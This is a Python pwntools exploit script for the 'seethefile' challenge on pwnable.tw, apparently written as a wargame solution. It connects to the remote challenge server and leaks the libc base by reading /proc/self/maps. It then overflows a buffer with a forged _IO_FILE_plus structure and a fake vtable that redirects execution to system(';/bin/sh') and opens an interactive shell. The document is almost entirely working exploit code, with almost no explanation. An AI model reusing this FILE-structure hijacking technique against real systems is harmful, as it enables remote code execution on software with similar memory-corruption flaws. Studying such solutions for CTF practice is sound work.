#!/usr/bin/env python3

from pwn import *

path = "./seethefile"
#path = "./seethefile_patched"

exe = ELF(path)
#libc = ELF("./libc-2.23.so")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

r = None

context.binary = exe

def conn(debug):
    global r
    if debug:
        r = process(path)
    else:
        r = remote("chall.pwnable.tw", 10200)

def openfile(filename):
    r.sendlineafter(b" :", b"1")
    r.sendlineafter(b" :", filename)

def read():
    r.sendlineafter(b" :", b"2")

def write():
    r.sendlineafter(b" :", b"3")
    return r.recvuntil(b"---------------MENU---------------\n").replace(b"---------------MENU---------------\n", b"")

def create_fake_FILE():
    ret = b""
    IO_IS_BUFFER = 0x2000
    ret += p32(0xffffffff ^ IO_IS_BUFFER) #flags offset:0
    ret += b";/bi"#read_ptr offset:0x8
    ret += b"n/sh"#read_end offset:0xc
    ret += b";XXX"#read_base offset:0x10
    ret += b"XXXX"#write_base offset:0x14
    ret += b"XXXX"#write_ptr 0ffset:0x18
    ret += b"XXXX"#write_end offset:0x1c
    ret += b"XXXX"#buf_base offset:0x20
    ret += b"XXXX"#buf_end offset:0x24
    ret += b"XXXX"#save_base offset:0x28
    ret += b"XXXX"#backup_base offset:0x2c
    ret += b"XXXX"#save_end offset:0x30
    ret += b"XXXX"#_markers offset:0x34
    ret += b"XXXX"#_chain offset:0x38
    ret += b"XXXX"#_fileno offset:0x40
    ret += b"XXXX"#_flags2 offset:0x44
    ret += b"XXXX"#_old_offset
    ret += b"XX"#_cur_column
    ret += p8(0)#_vtable_offset
    ret += b"Y"#_shortbuf
    ret += p32(exe.symbols["name"] + 0x100)#_lock
    return ret

conn(0)

log.info( f"[FILENAME OBJ] {hex(exe.symbols['filename'])}" )
log.info( f"[NAME OBJ] {hex(exe.symbols['name'])}" )

# read /proc/self/maps
openfile(b"/proc/self/maps")

# determine libc base address
# parsing the specific libc is kind of a pain
maps = b"";
tmp = b"XXX\n";
while tmp != b"":
    maps += tmp
    read()
    tmp = write()[:-1] # get rid of trailing \n

address = b""
for region in maps.split(b"\n"):
    if b"libc" in region:
        libc.address = int( "0x" + region.split(b"-")[0].decode(), 16 )
        break

log.info( f"[LIBC BASE] {hex(libc.address)}" )

# to see current _IO_FILE_plus structure
# in gdb: p *(struct _IO_FILE_plus*)fp 

# construct fake _IO_FILE_plus
evil_file_plus = create_fake_FILE()
r.sendlineafter(b":", b"5")

pad = b"A"*0x20
fake_pointer_addr = exe.symbols["fp"] + 0x10
fake_addr = exe.symbols["fp"] + 0x10

fake_jump_table = p32(fake_pointer_addr + 0x94)*2 + p32(libc.symbols["system"])

input()

payload = pad 
payload += p64(fake_pointer_addr)
payload += p64(fake_addr)
payload += evil_file_plus
payload += p32(exe.symbols["name"]+0x80)
payload += b"A"*0x44
payload += fake_jump_table

r.sendlineafter(b":", payload)

r.interactive()

